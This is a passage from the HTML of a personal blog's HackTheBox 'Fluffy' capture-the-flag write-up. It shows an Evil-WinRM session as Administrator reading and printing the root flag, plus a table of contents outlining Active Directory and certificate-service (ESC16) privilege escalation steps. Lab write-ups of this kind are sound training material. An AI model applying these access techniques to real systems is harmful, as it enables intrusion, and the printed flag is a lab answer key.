+</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="sb">`</span>quoting_detection_proc<span class="err">&#39;</span> <span class="k">for</span> module Reline                                                                                                                            
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span class="line"><span class="cl">                                        
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><p>Got the root flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd</span> Desktop
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">-ar---        7/10/2025   8:20 AM             <span class="m">34</span> root.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; cat root.txt
+</span></span><span class="line"><span class="cl">d003560ccbace6f865737605a177b0b8
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; 
+</span></span></code></pre></div><p><code>root flag = d003560ccbace6f865737605a177b0b8</code></p>
+
+      </div>
+
+      
+        <footer class="post-footer">
+          <div class="post-tags-footer">
+            <span class="tags-label">Tags:</span>
+            
+              <a href="/tags/hackthebox" class="post-tag">HackTheBox</a>
+            
+              <a href="/tags/active-directory" class="post-tag">Active Directory</a>
+            
+              <a href="/tags/smb" class="post-tag">SMB</a>
+            
+              <a href="/tags/ntlm" class="post-tag">NTLM</a>
+            
+              <a href="/tags/privilege-escalation" class="post-tag">Privilege Escalation</a>
+            
+          </div>
+        </footer>
+      
+
+
+      <nav class="post-navigation" aria-label="Post navigation">
+        
+
+        
+          <a
+            href="/hackthebox/dog/"
+            class="nav-link nav-next"
+            aria-label="Next post: Dog">
+            <span class="nav-label">Next</span>
+            <span class="nav-title">Dog</span>
+          </a>
+        
+      </nav>
+    </article>
+
+    
+  <aside class="post-toc" id="post-toc" aria-label="Table of contents">
+    <button
+      class="toc-toggle"
+      id="toc-toggle"
+      aria-expanded="true"
+      aria-controls="toc-content"
+      aria-label="Toggle table of contents">
+      <svg
+        class="toc-burger-icon"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true">
+        <line x1="3" y1="6" x2="21" y2="6"></line>
+        <line x1="3" y1="12" x2="21" y2="12"></line>
+        <line x1="3" y1="18" x2="21" y2="18"></line>
+      </svg>
+      <span class="toc-toggle-text">Table of Contents</span>
+      <svg
+        class="toc-chevron-icon"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        aria-hidden="true">
+        <polyline points="6 9 12 15 18 9"></polyline>
+      </svg>
+    </button>
+    <div class="toc-content" id="toc-content">
+      <nav class="toc-nav" aria-label="Table of contents">
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#fluffy">Fluffy</a>
+      <ul>
+        <li><a href="#pinging">Pinging</a></li>
+        <li><a href="#nmap">Nmap</a></li>
+        <li><a href="#addmember">AddMember</a></li>
+        <li><a href="#add-user-in-any-outbound-object">Add user in any outbound Object</a></li>
+        <li><a href="#ldap_svc"><code>LDAP_SVC</code></a>
+          <ul>
+            <li><a href="#winrm_svcfluffyhtb"><code>WINRM_SVC@FLUFFY.HTB</code></a></li>
+            <li><a href="#ca_svcfluffyhtb"><code>CA_SVC@FLUFFY.HTB</code></a></li>
+          </ul>
+        </li>
+        <li><a href="#esc16-security-extension-is-disabled"><strong><code>&#34;ESC16&#34;: &#34;Security Extension is disabled.&#34;</code></strong></a></li>
+        <li><a href="#administrator-access">Administrator Access:</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      </nav>
+    </div>
+  </aside>
+
+
+  </div>
+
+    </main>
+
+    <footer>
+      <footer class="site-footer">
+  <div class="footer-content">
+    <p class="footer-text">
+      &copy;
+      
+      2026
+      
+      Bukhari&#39;s Archive.
+      
+        Writeups • Research • Exploitation
+      
+    </p>
+    
+      <div class="footer-social">
+        <div class="social-links">
+  
+    <a
+      href="https://github.com/B3TA-BLOCKER"
+      target="_blank"
+      rel="noopener noreferrer"
+      class="social-link"
+      aria-label="GitHub">
+      <svg fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          fill-rule="evenodd"
+          d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z"
+          clip-rule="evenodd"></path>
+      </svg>
+    </a>
+  
+
+  
+
+  
+    <a href="mailto:yourmail@example.com" class="social-link" aria-label="Email">
+      <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"></path>
+      </svg>
+    </a>
+  
+</div>
+
+      </div>
+    
+  </div>
+</footer>
+
+    </footer>
+
+    <div id="search-modal" class="search-modal" aria-hidden="true" role="dialog" aria-label="Search">
+  <div class="search-modal-backdrop" id="search-modal-backdrop"></div>
+  <div class="search-modal-container">
+    <div class="search-input-wrapper">
+      <svg class="search-input-icon" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path
+          stroke-linecap="round"
+          stroke-linejoin="round"
+          stroke-width="2"
+          d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
+      </svg>
+      <input
+        type="search"
+        id="search-input"
+        class="search-input"
+        placeholder="Search..."
+        autocomplete="off"
+        aria-label="Search input">
+      <button class="search-input-clear" id="search-input-clear" aria-label="Clear search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path>
+        </svg>
+      </button>
+      <button class="search-modal-close" id="search-modal-close" aria-label="Close search">
+        <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path
+            stroke-linecap="round"
+            stroke-linejoin="round"
+            stroke-width="2"
+            d="M6 18L18 6M6 6l12 12"></path>
+        </svg>
+      </button>
+    </div>
+    <div id="search-results" class="search-results"></div>
+  </div>
+</div>
+
+    
+
+    <button id="scroll-to-top" class="scroll-to-top" aria-label="Scroll to top" type="button">
+  <svg fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+    <path
+      stroke-linecap="round"
+      stroke-linejoin="round"
+      stroke-width="2"
+      d="M5 10l7-7m0 0l7 7m-7-7v18"></path>
+  </svg>
+</button>
+
+
+    
+
+
+
+
+
+
+
+
+
+
+<script src="/js/main.min.cdc6a3c4f498c0556bc507848c493a55af2da9b14233c21300b240b89857180d.js" defer></script>
+
+  </body>
+</html>
